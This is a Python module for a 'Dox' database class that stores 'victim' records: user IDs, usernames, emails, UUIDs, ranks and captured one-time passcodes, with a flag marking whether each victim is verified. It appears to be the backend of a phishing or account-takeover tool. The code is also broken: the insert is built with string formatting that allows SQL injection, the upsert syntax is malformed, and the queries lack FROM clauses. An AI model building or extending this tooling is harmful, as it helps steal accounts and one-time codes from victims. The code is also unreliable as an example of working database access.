from typing import *
from modules.ext import BaseTable

class Dox(BaseTable):
    def __init__(self, database) -> None:
        super().__init__(database)
    
    async def create_table(self):
        await self._db.execute(
            '''
            CREATE TABLE IF NOT EXISTS
            VICTIM(
                USER_ID INT PRIMARY KEY,
                USERNAME STR,
                EMAIL STR,
                UUID STR,
                RANK STR,
                OTP STR DEFAULT NULL,
                VERIFIED STR DEFAULT FALSE
            )
            '''
        )
    
    async def add_victim(
        self,
        user_id:int,
        username:str, 
        email:str,
        uuid:Optional[str],
        rank:Optional[str],
        ) -> None:
        await self._db.execute(
            '''
            INSERT INTO VICTIM(USER_ID, USERNAME, EMAIL, UUID, RANK)
            VALUES({user_id}, {username}, {email}, {uuid}, {rank})
            ON CONFLICT (EMAIL)
            DO
                UPDATE VICTIM
                SET 
                    USERNAME = {username},
                    EMAIL = {email},
                    UUID = {uuid},
                    RANK = {rank},
                    OTP = NULL,
                    VERIFIED = FALSE
                WHERE USER_ID = {user_id}
            '''.format(user_id=user_id, username=username, email=email, uuid=uuid, rank=rank)
        )
    
    async def update_otp(self, user_id:int, otp:int) -> None:
        await self._db.execute(
            '''
            UPDATE VICTIM SET OTP = ? WHERE USER_ID = ?;
            ''',
            (otp, user_id)
            )
        
        await self._db.execute(
            '''
            UPDATE VICTIM SET VERIFIED = TRUE WHERE USER_ID = ?;
            ''',
            (user_id,)
            )
    
    async def fetch_victim(self, user_id:int) -> Dict:
        data = await self._db.execute(
            '''
            SELECT *
            WHERE USER_ID = ?
            ''',
            (user_id,)
            )
        
        info = {}
        for i, name in enumerate(['user_id' ,'username', 'data', 'uuid', 'rank', 'otp', 'verified']):
            info[name] = data[i]
        return info
    
    async def is_verified_email(self, email:str) -> bool:
        emails = await self._db.execute('SELECT EMAIL WHERE VERIFIED = TRUE')
        return email in list(map(lambda x: x[0], emails))